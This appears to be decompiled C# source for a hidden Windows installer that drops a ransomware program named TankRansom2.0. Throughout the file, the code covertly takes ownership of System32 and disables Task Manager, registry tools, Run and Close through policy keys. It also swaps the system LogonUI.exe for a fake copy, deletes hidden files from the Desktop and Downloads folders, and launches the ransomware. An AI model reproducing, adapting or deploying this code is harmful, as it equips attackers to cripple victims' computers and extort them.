using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Installator;

public class Form1 : Form
{
	private IContainer components = null;

	private Timer tmr_start_ransom;

	private Timer start_cmd;

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\""
		});
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		registryKey3.SetValue("NoRun", 1, RegistryValueKind.DWord);
		registryKey3.SetValue("NoClose", 1, RegistryValueKind.DWord);
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		start_cmd.Start();
		tmr_start_ransom.Start();
	}

	private void tmr_start_ransom_Tick(object sender, EventArgs e)
	{
		tmr_start_ransom.Stop();
		Process.Start("C:\\Windows\\System32\\TankRansom2.0.exe");
		((Form)this).Close();
		Application.Exit();
	}

	private void start_cmd_Tick(object sender, EventArgs e)
	{
		start_cmd.Stop();
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = text;
		Extract("Installator", "C:\\Windows\\System32", "RansomFiles", "LogonUIfake.exe");
		Extract("Installator", "C:\\Windows\\System32", "RansomFiles", "voice.vbs");
		Extract("Installator", "C:\\Windows\\System32", "RansomFiles", "TankRansom2.0.exe");
		File.Copy("C:\\Windows\\System32\\LogonUI.exe", "C:\\Windows\\System32\\LogonUIreal.exe");
		File.Delete("C:\\Windows\\System32\\LogonUI.exe");
		File.Copy("C:\\Windows\\System32\\LogonUIfake.exe", "C:\\Windows\\System32\\LogonUI.exe");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		string text3 = text2;
		string[] array3 = (from f in Directory.EnumerateFiles(text3 + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array4 = array3;
		foreach (string path2 in array4)
		{
			File.Delete(path2);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		components = new Container();
		tmr_start_ransom = new Timer(components);
		start_cmd = new Timer(components);
		((Control)this).SuspendLayout();
		tmr_start_ransom.set_Enabled(true);
		tmr_start_ransom.set_Interval(20000);
		tmr_start_ransom.add_Tick((EventHandler)tmr_start_ransom_Tick);
		start_cmd.set_Enabled(true);
		start_cmd.set_Interval(10000);
		start_cmd.add_Tick((EventHandler)start_cmd_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("r8Jki9kqCK9ej3id");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
